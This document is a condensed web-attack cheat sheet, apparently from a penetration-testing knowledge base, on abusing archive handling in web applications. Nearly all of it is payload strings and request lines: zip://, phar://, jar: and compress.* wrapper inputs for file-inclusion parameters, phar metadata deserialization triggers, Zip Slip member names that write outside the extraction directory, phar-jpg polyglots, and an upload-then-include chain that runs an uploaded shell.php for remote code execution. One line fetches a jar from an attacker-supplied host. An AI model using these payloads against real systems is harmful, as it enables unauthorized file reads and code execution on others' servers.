# Archive Traversal — zip/phar/tar and the container-escape

## The shape — read inside an archive the app unpacks

A `.zip`/`.tar`/`.phar`/`.rar` the app extracts — the archive's member
paths can escape the extraction dir OR the archive itself is a parse
surface.

## Zip — `zip://` member-read

```
?file=zip:///path/to/x.zip#inside/file.php
?file=zip://./uploads/x.zip%23shell.php
?file=zip:///tmp/x.zip%23x.php
```

`zip://`+`#` = the member — reads inside the zip without extracting.

## `phar://` — the phar-metadata deser-trigger

```
phar:///path/x.phar/a
phar://./uploads/x.phar/y
phar:///tmp/x.jpg/z             — a renamed phar still triggers
```

`phar://` access unserializes the phar's METADATA — the metadata is
the serialized payload — `phar://` + an upload = the deser-trigger —
`web-deserialization`.

## Tar — `tar:`/member + the path-traversal inside

```
tar:file:///x.tar!/inside/file        — some libs
?file=/path/x.tar                     — the tar's raw bytes — strings leak
```

A tar member-name `../../evil.php` — the "Zip Slip" — the extraction
escapes the target dir — the write-traversal.

## The "the archive IS the file-read" — the raw-bytes read

`file:///x.zip` reads the zip's raw bytes — the bytes carry the members'
names and compressed data — `strings`/`unzip -l` offline recovers the
file-list — the zip-listing-oracle.

## The `jar:`/`netdoc:` — Java's archive-URL

```
jar:file:///x.jar!/inside/path
jar:file:///app.war!/WEB-INF/web.xml
jar:file:///app.war!/WEB-INF/classes/application.properties
jar:http://YOU/x.jar!/y
netdoc:///x.jar!/y
```

`jar:` = the Java archive-URL — `file!/inside` — reads inside jars/
wars/zips — `../../web-xxe/references/java-specific.md` territory.

## The `compress.zlib`/`compress.bzip2` — the decompressors

```
compress.zlib://x.gz
compress.bzip2://x.bz2
compress.rar://x.rar
compress.lzf://x.lzf
```

PHP `compress.*` — decompresses — `compress.zlib://x.gz` = gunzip read.

## The `.gz`/`.bz2`/`.xz` — the raw-compressed read

```
?file=/path/x.log.gz                 — raw gzip bytes
?file=compress.zlib:///path/x.log.gz — decompressed content
```

The raw-bytes vs decompressed — `compress.*` decompresses on read.

## The "the archive is a polyglot" — zip+php/polyglot

A file that's BOTH a valid zip and PHP code — a `<?php` zip-comment +
a zip-member — the polyglot-upload — `web-file-upload`'s `polyglot-*`
modules.

## The `phar-stub` trick — the phar-with-`.jpg`-name

```
phar:///tmp/image.jpg/anything
```

A `.jpg` that's really a phar — `phar://` reads it regardless of the
extension — the phar-stub is at the file's START — `__HALT_COMPILER();`
the phar signature can be prefixed with image bytes — a phar-jpg
polyglot.

## The `zip://` inside an upload — the upload-plus-LFI chain

```
POST /upload — upload x.zip
GET /page?file=zip:///var/www/uploads/x.zip%23shell.php
```

Upload a zip with a `shell.php` member → `zip://`-include the member —
the upload-LFI-RCE chain.

## The `tar:`/`cpio`/`iso9660`/`sqfs`/`efi`/`ar`/`cpio`/`xar` — the exotic containers

`ar`(`.a`)/`cpio`/`xar`/`sqfs`/`iso9660`/`efi`/`vhd`/`vmdk`/`vdi` —
the library-dependent containers — `libarchive`-backed apps read many —
a `.a`/`.cpio` upload may unpack.

## The "the archive's `..` in the member-name" — the Zip-Slip write

A member named `../../var/www/html/x.php` — when the app extracts,
the member escapes the target dir — the write-traversal — `web-file-upload`'s
`../../web-file-upload/references/archive-attacks.md`.

## The "the archive is encrypted" — the password-gap

An encrypted zip member — `zip://x.zip#member` needs the password —
the raw-bytes read still shows the structure — the "the zip is locked
but the metadata isn't" oracle — the member-names are often unencrypted.

## The "the archive has a `manifest`/`metadata`" — the manifest-read

`META-INF/MANIFEST.MF`/`META-INF/*.xml`/`maven-metadata.xml`/`gemspec`/
`package.json`/`composer.json` — the archive's own metadata — the
manifest-read reveals the package's version/deps.
